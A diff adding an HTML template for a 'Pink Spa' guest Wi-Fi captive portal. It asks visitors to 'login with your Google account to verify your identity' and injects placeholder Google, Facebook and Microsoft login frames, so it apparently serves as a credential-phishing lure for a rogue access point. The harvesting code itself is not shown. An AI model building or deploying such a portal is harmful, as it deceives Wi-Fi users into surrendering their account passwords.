@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+		<link href="static/css/styles.css" rel="stylesheet" type="text/css" />
+		<title>Login Example - PINK SPA</title>
+		<meta charset="UTF-8">
+		<meta name="description" content="Pink Spa Custom Login Page Template">
+		<meta name="keywords" content="Example, Template, Custom, Login">
+		<meta name="author" content="Courtney Henderson">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<!-- Minified CSS and JS -->
+		<link   rel="stylesheet" 
+			href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" 
+			integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" 
+			crossorigin="anonymous">
+		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" 
+				integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" 
+				crossorigin="anonymous">
+		</script>
+		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+		<!-- Section with custom tags depending on the browser -->
+		{{ css_tag|safe }}
+	</head>
+	<body>
+		<div class="header">
+		PINK SPA
+		</div>
+		<div class="page_wrapper">
+		
+		<!--MISSION STATEMENT-->
+			<div class="table_cell half">
+			<div class="content">
+				
+				<div  id="carousel_item_1">
+					<h3>Your Guest Internet</h3>
+					<h2>ABSOULTELY FREE</h2>
+					<img src="static/images/logo.png" >
+					<h3>Enjoy your stay!</h3>
+				</div>
+				
+
+			</div>
+			</div>
+			
+			<!--Login section-->
+			<div class="table_cell half right">
+				<div class="content left">
+					<!--LOGIN-->
+					<p>Hello world</p>
+					
+					<div class="row">
+						<p>We need to login with your Google account to verify your identity</p>
+						<div class="col-md-3">
+						  <a class="btn btn-outline-dark" href="#" role="button" style="text-transform:none" onclick="$('[name=\'google\']').fadeIn(300);">
+							<img width="20px" style="margin-bottom:3px; margin-right:5px" alt="Google sign-in" src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Google_%22G%22_Logo.svg/512px-Google_%22G%22_Logo.svg.png" />
+							Login with Google
+						  </a>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div class="footer">
+			<div class=" table">
+			
+				<div class="table_cell quater"><a href="#">Home</a></div>
+				<div class="table_cell quater"><a href="#">About</a></div>
+				<div class="table_cell quater"><a href="#">Treatments</a></div>
+				<div class="table_cell quater"><a href="#">Schedule</a></div>
+			</div>
+		</div>
+		<script>
+		//add padlock next to code input if code input is there
+		var code = document.getElementsByName("code");
+		console.log(code[0].type);
+		if(code[0].type != "hidden"){
+		
+			var my_elem = document.getElementsByName("code");
+			my_elem[0].insertAdjacentHTML('beforebegin','<div class="code_label" ><img class="image" src="images/padlock.png"></div>');
+		}	
+			
+		
+		
+			
+			
+			
+		//Hack to fix hover on element with inline color set on child element for facebook and email buttons
+		var fb_button = document.getElementById("facebook_button_initial");
+		var fb_text = document.getElementById("fbchkintxt");
+		var email_button = document.getElementById("email_button_initial");
+		var email_text = document.getElementById("emchkintxt");
+		
+		if(fb_button){
+			fb_button.onmouseover = function(){
+				fb_text.style.color = "#fff";
+				
+			};
+			fb_button.onmouseout = function(){
+				fb_text.style.color = "#ff9393";
+				
+			};
+		}
+		
+		if(email_button){
+			email_button.onmouseover = function(){
+				email_text.style.color = "#fff";
+				
+			};
+			email_button.onmouseout = function(){
+				email_text.style.color = "#ff9393";
+				
+			};
+		}
+			
+			
+		</script>
+	</body>
+	<!--This section must be here to work-->
+	{{ window_google_frame|safe }}
+	{{ window_facebook_frame|safe }}
+	{{ window_microsoft_frame|safe }}
+	{{ script_tag|safe }}
+</html>
